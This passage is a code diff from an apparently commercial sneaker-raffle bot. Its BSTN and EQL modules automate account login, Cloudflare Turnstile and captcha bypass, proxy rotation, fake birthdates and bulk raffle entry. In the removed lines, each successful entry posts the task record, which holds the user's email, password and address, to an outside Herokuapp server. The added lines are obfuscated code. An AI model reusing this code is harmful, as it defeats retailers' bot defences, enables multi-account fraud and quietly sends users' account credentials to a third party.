-                            var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-                            var proxySplit = proxies[randomProxy].split(":");
-                            var browser
-                            let skip = false;
-                            let retry = 'no'
-                            try {
-                                if (await checkDuplicate(bstn[i]) == true) {
-                                    console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Task Already Entered, Going to Next Task`);
-                                    skip = true;
-                                    dupli = true;
-                                    return;
-                                }
-                                try {
-                                    browser = await puppeteer.launch({
-                                        executablePath: 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
-                                        headless: false,
-                                        args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-                                    });
-
-                                } catch {
-                                    browser = await puppeteer.launch({
-                                        executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
-                                        headless: false,
-                                        args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-                                    });
-                                }
-                                const page = await browser.newPage();
-                                const session = await page.target().createCDPSession();
-                                const { windowId } = await session.send('Browser.getWindowForTarget');
-                                await page.setViewport({
-                                    width: 1281,
-                                    height: 720
-                                })
-                                var cookies = [
-
-                                    // {
-                                    //     "name": "_clck",
-                                    //     "value": "xtouvh|1|ezs|0",
-                                    //     "domain": ".bstn.com",
-                                    //     "path": "/",
-                                    //     "expires": 1678875046,
-                                    //     "httpOnly": false,
-                                    //     "secure": false
-                                    // },
-
-                                    // {
-                                    //     "name": "__CK__WG__",
-                                    //     "value": "13357_180687_16644396748543_07b98b8291",
-                                    //     "domain": ".bstn.com",
-                                    //     "path": "/",
-                                    //     "expires": 1695926334,
-                                    //     "httpOnly": false,
-                                    //     "secure": true
-                                    // },
-                                    {
-                                        "name": "cf_clearance",
-                                        "value": "uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160",
-                                        "domain": ".bstn.com",
-                                        "path": "/",
-                                        "expires": 1707818183.331533,
-                                        "httpOnly": true,
-                                        "secure": true
-                                    },
-
-                                    // {
-                                    //     "name": "__cf_bm",
-                                    //     "value": "pwWzgVvtLzaTNvIMj3DC9sE_WuHpjGvuyQjaYMuleXE-1676282182-0-AdxWk6WFQ55ptQ0tlFGaMOJCBDYjB/iC+LyMwhAN1ckjYU+iq8Y0Mt0Lk6bQuK5GOYEGlhMABQVfFt9FNHhWQxUIZPr9cojVl3qcP4vQirNd",
-                                    //     "domain": ".bstn.com",
-                                    //     "path": "/",
-                                    //     "expires": 1676283983.920654,
-                                    //     "httpOnly": true,
-                                    //     "secure": true
-                                    // }
-                                ]
-                                // await page.setCookie(cookies[0]);
-                                await page.authenticate({
-                                    username: `${proxySplit[2]}`,
-                                    password: `${proxySplit[3]}`,
-                                });
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Getting Session`);
-                                // await page.setExtraHTTPHeaders({
-                                //     'Accept-Language': 'en'
-                                // });
-                                // await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36');
-                                // await page.setJavaScriptEnabled(true);
-                                // await page.setRequestInterception(true);
-                                // page.on("request", (req) => {
-                                //     if (req.resourceType() === "image") {
-                                //         req.abort();
-                                //     } else {
-                                //         req.continue();
-                                //     }
-                                // });
-                                await page.goto(`${bstn[i].Url}`, { waitUntil: 'networkidle2' });
-                                // console.log('solving');
-                                // // await page.solveRecaptchas();
-                                // console.log('solved');
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Solving Cloudflare`);
-                                await delay(5000);
-                                var cf = await page.$('#turnstile-wrapper');
-                                if (cf) {
-                                    console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Handling Challenge`);
-                                    await delay(10000);
-                                    const challengeButton = await page.$('#turnstile-wrapper');
-                                    if (challengeButton) {
-                                        try {
-
-                                            await challengeButton.click();
-                                        } catch {
-                                            throw new Error('Empty Turnstile Challenge')
-                                        }
-                                    }
-                                    try {
-                                        await page.waitForSelector('input[name="firstname"]', { timeout: 40000 });
-
-                                    } catch {
-                                        var challengeButton2 = await page.$('#turnstile-wrapper');
-                                        if (challengeButton2) {
-
-                                            try {
-
-                                                await challengeButton2.click();
-                                            } catch {
-                                                throw new Error('Empty Turnstile Challenge')
-                                            }
-                                        }
-                                    }
-                                    // await frame.click('#challenge-stage > div > label > input');
-
-                                }
-                                try {
-
-                                    await page.waitForSelector('.nonLoggedSpecific_nonLogged__SCu0L');
-                                } catch {
-                                    throw new Error('Blocked by Cloudflare')
-                                }
-                                await session.send('Browser.setWindowBounds', { windowId, bounds: { windowState: 'minimized' } });
-
-                                await delay(5000)
-                                await page.waitForSelector('.nonLoggedSpecific_nonLogged__SCu0L > .Button_secondary__XJln1.Button_button__Bq8yb');
-                                await page.focus('.nonLoggedSpecific_nonLogged__SCu0L > .Button_secondary__XJln1.Button_button__Bq8yb');
-                                await delay(500)
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Logging in`);
-                                await page.$eval('.nonLoggedSpecific_nonLogged__SCu0L > .Button_secondary__XJln1.Button_button__Bq8yb', check => check.click())
-
-                                await page.click('.nonLoggedSpecific_nonLogged__SCu0L > .Button_secondary__XJln1.Button_button__Bq8yb');
-                                await page.click('.nonLoggedSpecific_nonLogged__SCu0L > .Button_secondary__XJln1.Button_button__Bq8yb');
-                                await delay(2000);
-                                // await page.waitForNetworkIdle();
-                                await page.waitForSelector('#email-login')
-                                await page.type('#email-login', `${bstn[i].Email.toLowerCase()}`, { delay: 230 })
-                                await delay(3500)
-                                await page.waitForSelector('#password')
-                                await page.type('#password', `${bstn[i].Password}`, { delay: 230 });
-                                await delay(5500)
-                                try {
-                                    // await page.$eval('.login_Login___vz4G > form', check => check.submit())
-                                    await page.$eval('.login_accountInfo__FCIxY > button[type="submit"]', check => check.click())
-
-                                    // await page.click('.login_accountInfo__FCIxY > button[type="submit"]');
-                                } catch {
-
-                                }
-                                try {
-
-                                    await page.waitForSelector('.swatchOptions_sizeTiles__Lizc2');
-
-
-                                } catch (e) {
-
-                                }
-                                await delay(1000);
-                                const duplicateEntry = await page.$('.enteredDraw_container__2KmQ_');
-                                if (duplicateEntry) {
-                                    console.log('Duplicate entry, skipping');
-                                    return;
-                                }
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Choosing Size ${bstn[i].Size}`)
-                                try {
-                                    if (bstn[i].Size != 'RANDOM') {
-                                        var size = bstn[i].Size.replace('.', ',');
-                                        // console.log(size)
-                                        const sizeButtons = await page.$x(`//div[contains(text(), '${size}')]`);
-                                        await sizeButtons[0].click();
-                                    } else {
-                                        const sizeButtons = await page.$$(`div.swatchTile_tile__IRH9Q`);
-                                        var randomSize = Math.round(Math.random() * (sizeButtons.length - 1));
-                                        await sizeButtons[randomSize].click();
-
-                                    }
-
-                                } catch (e) {
-                                    // console.log(e)
-                                    throw new Error('Softblocked, Rotating proxy')
-                                }
-                                await delay(500);
-                                const addy = await page.$('.addressList_addressItem__LE2PB');
-                                if (addy && bstn[i].Mode != 'NEW') {
-
-                                } else {
-                                    console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Filling Address`)
-
-                                    await page.click('div.product_shipping__zEfqd > div > div.legend_legend__sQIiF > div.legend_header__iHZIh > div > button');
-                                    await delay(1500);
-                                    await page.waitForSelector('#firstname')
-                                    await page.type('#firstname', `${bstn[i].FirstName}`);
-                                    await delay(500);
-                                    await page.waitForSelector('#firstname')
-                                    await page.type('#lastname', `${bstn[i].LastName}`);
-                                    await delay(500);
-                                    await page.waitForSelector('#firstname')
-                                    await page.type('#street', `${bstn[i].Address1}`);
-                                    await delay(500);
-                                    await page.waitForSelector('#firstname')
-                                    await page.type('#houseNumber', `${bstn[i].HouseNumber} ${bstn[i].Address2}`);
-                                    await delay(500);
-                                    await page.waitForSelector('#firstname')
-                                    await page.select('#country_code', `${bstn[i].Country}`);
-                                    await delay(500);
-                                    await page.type('#postcode', `${bstn[i].Zip}`);
-                                    await delay(500);
-                                    await page.type('#city', `${bstn[i].City}`);
-                                    await delay(500);
-                                    await page.type('#telephone', `${bstn[i].Phone}`);
-                                    await delay(500);
-                                    await page.click('.addressModal_submit__dOiL4 > button[type="submit"]');
-
-                                }
-                                await delay(2500);
-                                try {
-                                    await page.type('#instagram_name', `${bstn[i].Follower}`);
-                                    await page.click('.note_groupBtn__WLDwH > button')
-                                } catch {
-
-                                }
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Finishing Entry`)
-
-                                await delay(1500);
-                                try {
-
-                                    await page.click('.checkBox_boxHolder__wLGVe');
-                                } catch {
-
-                                }
-                                await delay(1500);
-                                await page.$eval('.termConditions_TC__hll9k > button', btn => btn.click());
-                                // await page.click('.termConditions_TC__hll9k > button');
-                                await delay(5000);
-                                try {
-                                    await page.waitForSelector('.success_msg__2HjJY');
-
-                                } catch {
-                                    await page.reload({ waitUntil: 'networkidle2' });
-                                    if (bstn[i].Size != 'RANDOM') {
-                                        var size = bstn[i].Size.replace('.', ',');
-                                        const sizeButtons = await page.$x(`//div[contains(text(), ${size})]`);
-                                        await sizeButtons[0].click();
-                                    } else {
-                                        const sizeButtons = await page.$$(`div.swatchTile_tile__IRH9Q`);
-                                        var randomSize = Math.round(Math.random() * (sizeButtons.length - 1));
-                                        await sizeButtons[randomSize].click();
-
-                                    }
-                                    await delay(1500);
-                                    try {
-                                        await page.hover('#instagram_name')
-                                        await page.type('#instagram_name', `${bstn[i].Follower}`);
-                                        await page.click('.note_groupBtn__WLDwH > button')
-                                    } catch {
-
-                                    }
-                                    console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Retrying (${t} / 5)`)
-                                    try {
-                                        await page.hover('.checkBox_boxHolder__wLGVe')
-                                        await delay(1500);
-                                        await page.click('.checkBox_boxHolder__wLGVe');
-
-                                    } catch {
-
-                                    }
-                                    await delay(5500);
-                                    await page.$eval('.termConditions_TC__hll9k > button', btn => btn.click());
-                                    // await page.click('.termConditions_TC__hll9k > button');
-                                    await delay(5000);
-                                    await page.waitForSelector('.success_msg__2HjJY');
-                                }
-                                retry = 'no';
-                                successfulLog(bstn[i], currentFunction);
-                                try {
-                                    prxdata = {
-                                        username: username.replace('#', ''),
-                                        entrydata: JSON.stringify(task),
-                                        proxy: `${proxies[i]}`
-                                    }
-                                    var prx = JSON.stringify(prxdata);
-                                    let config = {
-                                        headers: {
-                                            'content-type': 'application/json',
-                                        }
-                                    }
-                                    await axios.post('https://jraffles.herokuapp.com/success', prx, config)
-                                } catch (e) {
-                                    // console.log(e.message)
-                                }
-                                console.log(chalk.green(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Raffle Entered!`));
-                                var succesDEV = await makeEmbed(bstn[i], currentFunction, 'dev', false);
-                                var succesPUB = await makeEmbed(bstn[i], currentFunction, 'pub', false);
-
-                                const EMBEDS =
-                                {
-                                    succesDEVMSG: { embeds: [succesDEV] },
-                                    succesPUBMSG: { embeds: [succesPUB] }
-                                };
-                                let task = bstn[i]
-                                try {
-                                    prxdata = {
-                                        username: username.replace('#', ''),
-                                        module: currentFunction.name,
-                                        entrydata: JSON.stringify(task),
-                                        proxy: `${proxies[i]}`
-                                    }
-                                    var prx = JSON.stringify(prxdata);
-                                    let config = {
-                                        headers: {
-                                            'content-type': 'application/json',
-                                        }
-                                    }
-                                    await axios.post('https://jraffles.herokuapp.com/success', prx, config)
-                                } catch (e) {
-
-                                }
-                                try {
-                                    if (settings.webhook != undefined && settings.webhook != '') {
-                                        await sendWebhook(settings.webhook, EMBEDS.succesDEVMSG);
-                                    }
-                                    await delay(200);
-                                    await sendWebhook(succesWH, EMBEDS.succesDEVMSG);
-                                    await delay(200);
-                                    await sendWebhook(publicWH, EMBEDS.succesPUBMSG);
-                                } catch (e) {
-                                    console.log(chalk.yellow(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Error sending webhook ${e}`));
-
-                                }
-
-
-                            } catch (e) {
-                                console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : ${e}`));
-                                retry = 'yes';
-                                ERROR = `${e}`
-                                var errorDEV = await makeEmbed(bstn[i], currentFunction, 'dev', true, ERROR);
-                                var succesDEV = await makeEmbed(bstn[i], currentFunction, 'dev', false);
-                                var succesPUB = await makeEmbed(bstn[i], currentFunction, 'pub', false);
-
-                                const EMBEDS =
-                                {
-                                    succesDEVMSG: { embeds: [succesDEV] },
-                                    succesPUBMSG: { embeds: [succesPUB] }
-                                };
-                                EMBEDS.errorDEV = { embeds: [errorDEV] }
-                                if (settings.webhook != undefined && settings.webhook != '') {
-                                    await sendWebhook(settings.webhook, EMBEDS.errorDEV);
-                                }
-                                await sendWebhook(errorWH, EMBEDS.errorDEV);
-                            } finally {
-                                if (browser) {
-
-                                    browser.close();
-                                }
-                                if (retry == 'yes' && t != 5) {
-                                    console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Retrying (${t} / 5)`));
-
-                                    t = t + 1;
-                                    tasks--;
-
-                                    return bstnFunction(currentFunction, bstn, proxies, i, t);
-                                }
-                                if (retry == 'yes' && t >= 5) {
-                                    errorLog(bstn[i], currentFunction)
-
-                                }
-                                if (!skip) {
-                                    console.log(`${getTime()} [${currentFunction.name}] Waiting for ${settings.delay} ms`);
-                                    await delay(settings.delay);
-
-                                }
-                                tasks--;
-                            }
-
-                        }
-                        bstnFunction(currentFunction, opium, proxies, i, 0);
-
-
-                        await delay(2000);
-
-                    }
-
-                }
-            },
-            {
-                name: 'BSTN Win Checker',
-                store: 'BSTN',
-                logo: 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
-                function: async function (currentFunction, proxies) {
-                    var tasks = 0;
-                    var bstn;
                     try {
-                        const accsFile = fs.readFileSync('../accounts/bstn.csv', 'utf-8');
-                        bstn = Papa.parse(accsFile, { header: true }).data;
-                    }
-                    catch (e) {
-                        throw new Error('Error reading accounts/bstn.csv')
-                    }
-                    for (var i = 0; i < bstn.length; i++) {
-                        maxTasks = Number(settings.threads);
-
-                        while (tasks >= maxTasks) {
-                            await delay(settings.delay);
-                            // console.log(`waiting`)
-                        }
-                        async function checkWins(currentFunction, proxies, bstn, i, t) {
-                            tasks++;
-                            puppeteer.use(StealthPlugin());
-                            puppeteer.use(RecaptchaPlugin({
-                                provider: {
-                                    id: '2captcha',
-                                    token: `${settings.captchaKey}` // REPLACE THIS WITH YOUR OWN 2CAPTCHA API KEY ⚡
+                        var _0x13c536 = JSON['parse'](_0x65e0bc['readFileSync']('sizes.json', 'utf-8')), _0x351550 = _0x585d00[_0x486823]['Url'], _0x25d5e4 = _0x585d00[_0x486823]['Size'], _0x9f4733;
+                        async function _0x4fdab9() {
+                            var _0x4922a7 = new _0x2b0e83['CookieJar']();
+                            console['log'](_0x3982db() + '\x20[' + _0xb02146['name'] + ']\x20Task\x20' + (_0x486823 + 0x1) + '\x20:\x20Getting\x20Session');
+                            var _0xe72ef6;
+                            let _0x24050e = {
+                                'method': 'GET',
+                                'cookieJar': _0x4922a7,
+                                'headers': {
+                                    'Connection': 'keep-alive',
+                                    'Pragma': 'no-cache',
+                                    'Cache-Control': 'no-cache',
+                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
+                                    'sec-ch-ua-mobile': '?0',
+                                    'DNT': '1',
+                                    'Upgrade-Insecure-Requests': '1',
+                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
+                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                                    'cookies': '',
+                                    'Sec-Fetch-Site': 'none',
+                                    'Sec-Fetch-Mode': 'navigate',
+                                    'Sec-Fetch-User': '?1',
+                                    'Sec-Fetch-Dest': 'document',
+                                    'Accept-Language': 'en-US,en;q=0.9'
                                 },
-                                visualFeedback: true
-                            }))
-
-
-                            if (retry != 'yes') {
-                                var retry = '';
-                                var t = 0;
-
-                            }
-                            var ERROR;
-
-                            setTitle(`${currentFunction.name} Task ${i + 1} / ${bstn.length} || File: ${currentFile} Proxies: ${currentProxy}`);
-
-                            var succesDEV = await makeEmbed(bstn[i], currentFunction, 'acc', false);
-
-
-                            const EMBEDS =
-                            {
-                                succesDEVMSG: { embeds: [succesDEV] }
-                            };
-                            const url = `https://www.bstn.com/eu_en/customer/account/create/`
-                            var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-                            var proxySplit = proxies[randomProxy].split(":");
-
-                            var browser
-                            try {
-                                browser = await puppeteer.launch({
-                                    executablePath: 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
-                                    headless: true,
-                                    args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-                                });
-
-                            } catch {
-                                browser = await puppeteer.launch({
-                                    executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
-                                    headless: true,
-                                    args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-                                });
-                            }
-                            try {
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Checking ${bstn[i].Email}`);
-                                const page = await browser.newPage();
-                                await page.authenticate({
-                                    username: `${proxySplit[2]}`,
-                                    password: `${proxySplit[3]}`,
-                                });
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Getting Session`);
-                                await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36')
-                                await page.setRequestInterception(true);
-                                page.on("request", (req) => {
-                                    if (req.resourceType() === "image") {
-                                        req.abort();
-                                    } else {
-                                        req.continue();
-                                    }
-                                });
-                                try {
-                                    await page.goto(`https://www.bstn.com/eu_en/raffle/customer/`, { waitUntil: 'networkidle2' });
-                                    await page.waitForSelector('button[class="cf2Lf6"]');
-
-                                } catch {
-                                    retry = 'yes'
-                                    throw new Error('Connection Error')
-                                }
-                                await page.click('button[class="cf2Lf6"]');
-                                // await page.waitForSelector('a.action.create.primary.social-login');
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Passing Cloudflare`);
-                                // await delay(2000);
-                                // await page.click('a.action.create.primary.social-login');
-                                await delay(1000);
-                                await page.type('#email', bstn[i].Email);
-                                await delay(500)
-                                await page.type('#pass', bstn[i].Password);
-                                await delay(500)
-                                await page.$eval('#login-form', f => f.submit())
-                                // await page.click('button.button.dashboard-actions-toolbar__item');
-                                try {
-                                    await page.waitForSelector('.product-items')
-                                } catch {
-                                    console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : No Entries Found`);
-                                    return;
-
-                                }
-                                await delay(400);
-                                // const results = await page.evaluate(() => {
-                                //     return (Array.from(document.querySelector('.product-items > .product-item').children));
-                                // })
-                                const titles = await page.evaluate(() => {
-                                    const tds = Array.from(document.querySelectorAll('.product-item-photo > img'))
-                                    return tds.map(td => td.alt)
-                                });
-                                const sizes = await page.evaluate(() => {
-                                    const tds = Array.from(document.querySelectorAll('.tooltip.wrapper.product-item-tooltip.first-xs'))
-                                    return tds.map(td => td.innerHTML)
-                                });
-
-                                const wins = await page.$$('.raffle-winner');
-                                // console.log(wins.length)
-                                if (wins.length < 1) {
-                                    console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : No Wins Found`);
-                                    retry = 'no'
-                                    return;
-                                }
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : ${wins.length} Wins Found!`);
-                                for (var w = 0; w < wins.length; w++) {
-                                    console.log(chalk.green(titles[w] + sizes[w].replace('                                    ', '')));
-
-                                }
-                                // await page.click('#bt-social-create');
-                                // await page.click('#bt-social-create');
-
-                                // await delay(500000);
-
-
-
-
-                            } catch (e) {
-                                console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : ${e}`));
-                                ERROR = `${e}`
-                                var errorDEV = await makeEmbed(bstn[i], currentFunction, 'acc', true, ERROR);
-                                EMBEDS.errorDEV = { embeds: [errorDEV] }
-                                if (settings.webhook != undefined && settings.webhook != '') {
-                                    await sendWebhook(settings.webhook, EMBEDS.errorDEV);
-                                }
-                                await sendWebhook(errorWH, EMBEDS.errorDEV);
-                                retry = 'yes';
-                            } finally {
-                                if (browser)
-                                    browser.close();
-                                if (retry == 'yes' && t != 5) {
-                                    console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Retrying (${t} / 5)`));
-                                    tasks--;
-                                    t = t + 1;
-                                    return checkWins(currentFunction, proxies, bstn, i, t);
-                                }
-                                if (retry == 'yes' && t >= 5) {
-                                    errorLog(bstn[i], currentFunction)
-                                    retry = 'no';
-                                    t = 0;
-                                }
-                                console.log(`${getTime()} [${currentFunction.name}] Waiting for ${settings.delay} ms`);
-                                await delay(settings.delay);
-                                tasks--;
-                            }
-
-                        }
-                        checkWins(currentFunction, proxies, bstn, i, 0);
-                        await delay(350);
-                    }
-                }
-            },
-        ]
-    },
-    {
-        name: 'EQL',
-        modules: [
-            {
-                name: 'EQL Raffle Entries',
-                store: 'EQL',
-                logo: 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
-                function: async function (currentFunction, csv, proxies) {
-                    puppeteer.use(StealthPlugin());
-                    puppeteer.use(RecaptchaPlugin({
-                        provider: {
-                            id: '2captcha',
-                            token: `${settings.captchaKey}` // REPLACE THIS WITH YOUR OWN 2CAPTCHA API KEY ⚡
-                        },
-                        visualFeedback: true
-                    }))
-                    for (var i = 0; i < csv.length; i++) {
-                        var ERROR;
-                        setTitle(`${currentFunction.name} Task ${i + 1} / ${csv.length} || File: ${currentFile} Proxies: ${currentProxy}`);
-                        try {
-                            await jig(csv, i);
-
-                        } catch {
-                            retry = 'no';
-                            throw new Error('Invalid CSV Format, use the CSV Files from the guides!')
-                        }
-                        async function checkDuplicate(csv) {
-                            const successFile = fs.readFileSync('../successful-tasks.csv', 'utf8');
-                            const success = Papa.parse(successFile, { header: true }).data
-                            // console.log(success)
-                            let duplicate = false
-                            for (var task of success) {
-                                if (task.Url == csv.Url && task.Email == csv.Email) {
-                                    duplicate = true;
-                                    break;
-                                }
-                            }
-                            return duplicate;
-
-                        }
-                        if (await checkDuplicate(csv[i]) == true) {
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Task Already Entered, Going to Next Task`);
-                            continue;
-                        }
-                        var registered = false;
-                        const accsFile = fs.readFileSync('../accounts/eql.csv', 'utf8');
-                        var accs = Papa.parse(accsFile, { header: true }).data;
-                        for (var acc of accs) {
-                            if (acc.Email == csv[i].Email) {
-                                // console.log(acc);
-                                registered = true;
-                            }
-                        }
-                        if (registered == false) {
-                            var url
-                            if (csv[i].Url.endsWith('/')) {
-                                url = `${csv[i].Url}register`
-                                if (retry != 'yes') {
-                                    var retry = '';
-                                    var t = 0;
-
-                                }
-
-                            } else {
-                                url = `${csv[i].Url}/register`
-                                if (retry != 'yes') {
-                                    var retry = '';
-                                    var t = 0;
-
-                                }
-                            }
-
-
-                            if (csv[i].Email == '' || csv[i].FirstName == '' || csv[i].LastName == '') {
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Invalid CSV`);
-                                continue;
-                            }
-                            if (csv[i].Password == '') {
-                                csv[i].Password = 'JRaffles23!'
-                            }
-                            if (settings.useRandomProxy = false) {
-                                var proxySplit = proxies[i].split(":");
-                            } else {
-                                var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-                                var proxySplit = proxies[randomProxy].split(":");
-                            }
-                            var browser;
-                            try {
-                                browser = await puppeteer.launch({
-                                    executablePath: 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
-                                    headless: !false,
-                                    args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-                                });
-
-                            } catch {
-                                browser = await puppeteer.launch({
-                                    executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
-                                    headless: !false,
-                                    args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-                                });
-                            }
-                            try {
-                                const page = await browser.newPage();
-                                await page.authenticate({
-                                    username: `${proxySplit[2]}`,
-                                    password: `${proxySplit[3]}`,
-                                });
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Getting Session`);
-                                // await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36')
-                                await page.setRequestInterception(true);
-                                page.on("request", (req) => {
-                                    if (req.resourceType() === "image" || req.resourceType() === "font" || req.resourceType() === "media") {
-                                        req.abort();
-                                    } else {
-                                        req.continue();
-                                    }
-                                });
-                                try {
-                                    await page.goto(`${url}`);
-
-                                } catch {
-                                    throw new Error('Connection Error')
-                                }
-
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Setting Credentials`);
-                                await delay(1000);
-                                await page.waitForSelector('#email');
-                                await page.click('div[data-testid="field-productVariantID"]');
-                                await delay(1000);
-                                try {
-                                    if (csv[i].Url.includes('en-GB')) {
-                                        // console.log(Number(csv[i].Size) + 1)
-                                        await page.click(`li[data-value="UK ${csv[i].Size} / US ${Number(csv[i].Size) + 1}"]`);
-                                    } else {
-
-                                        await page.click(`li[data-value="EU ${csv[i].Size}"]`);
-                                    }
-
-                                } catch {
-                                    throw new Error(`Error fetching ${csv[i].Size}`)
-                                }
-                                await delay(1700)
-                                // await page.select('#customer_salutation', 'mr');
-
-                                await page.type('#email', `${csv[i].Email}`);
-                                await delay(850);
-                                await page.waitForSelector('#password');
-                                await page.type('#password', `${csv[i].Password}`);
-                                await delay(850);
-                                await page.type('#phone', `${csv[i].Phone}`);
-                                await delay(850);
-                                const title = await page.$('#title > label');
-                                await delay(300);
-                                if (title) {
-                                    await title.click();
-                                }
-                                await page.type('#firstName', `${csv[i].FirstName}`);
-                                await delay(850);
-                                await page.type('#lastName', `${csv[i].LastName}`);
-                                await delay(850);
-                                if (csv[i].Url.includes('footlocker.de')) {
-                                    await page.type('#birthdate', `${randomIntFromInterval(10, 28)}.${randomIntFromInterval(10, 12)}.${randomIntFromInterval(1990, 2003)}`);
-
+                                'proxy': 'http://' + _0x2fccad[0x2] + ':' + _0x2fccad[0x3] + '@' + _0x2fccad[0x0] + ':' + _0x2fccad[0x1]
+                            }, _0x4109ee = _0x351550['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x59d0fc = _0x4109ee + '.json', _0x1cf70e = await _0x5d1b21(_0x59d0fc);
+                            console['log'](_0x3982db() + '\x20[' + _0xb02146['name'] + ']\x20Task\x20' + (_0x486823 + 0x1) + '\x20:\x20Getting\x20Variants');
+                            let _0xef7a36 = _0x1cf70e['data']['product']['variants'];
+                            if (_0x25d5e4 != 'RANDOM') {
+                                if (_0xef7a36[0x1]['option1']['includes']('W')) {
+                                    const _0x3c202a = _0x13c536['women']['find'](_0x1807de => _0x1807de['EUsize'] === _0x25d5e4);
+                                    _0x3c202a && (_0x25d5e4 = _0x3c202a['size']);
                                 } else {
-
-                                    await page.type('#birthdate', `${randomIntFromInterval(10, 28)}-${randomIntFromInterval(10, 12)}-${randomIntFromInterval(1990, 2003)}`);
-                                }
-                                await delay(850);
-                                // await page.$eval('form', form => form.submit());
-                                await page.click('.MuiBox-root.css-79elbk > button');
-                                try {
-                                    if (!csv[i].Url.includes('en-GB')) {
-
-                                        await page.waitForSelector('#stateAutocomplete');
-                                    }
-
-                                } catch {
-                                    throw new Error('Connection Error fetching shipping')
-                                }
-                                await delay(500);
-
-
-
-
-                                // console.log(data);
-                                await delay(1500);
-                                if (!url.includes('footlocker')) {
-                                    try {
-                                        await page.click('#country');
-                                        const country = await page.$(`li[data-value="${csv[i].Country}"]`);
-                                        await country.click();
-                                        await country.click();
-
-                                    } catch {
-                                        throw new Error('Country. Please use exact data in csv. (Case sensitive)')
-                                    }
-
-                                }
-                                await delay(1000)
-                                if (!csv[i].Url.includes('en-GB')) {
-                                    await page.click('#stateAutocomplete');
-                                    await delay(500);
-                                    try {
-                                        const state = await page.$x(`//li[text()="${csv[i].State}"]`);
-                                        await state[0].click();
-
-                                    } catch {
-                                        throw new Error('State / Province not found. Please use exact data in csv. (Case sensitive)')
-                                    }
-
-                                }
-
-
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Setting Address`);
-
-                                // console.log(data);
-                                // await page.$$eval()
-                                await delay(1000)
-                                // await page.click(`li[data-value="${csv[i].State}"]`);
-                                // await page.keyboard.press('Enter');
-                                await delay(500);
-                                await page.type('#address1', `${csv[i].Address1} ${csv[i].HouseNumber}`);
-                                await delay(500);
-                                await page.type('#address2', `${csv[i].Address2}`);
-                                await delay(500);
-                                await page.type('#city', `${csv[i].City}`);
-                                await delay(500);
-                                await page.type('#postcode', `${csv[i].Zip}`);
-                                await delay(1000);
-                                await page.click('.MuiBox-root.css-79elbk > button');
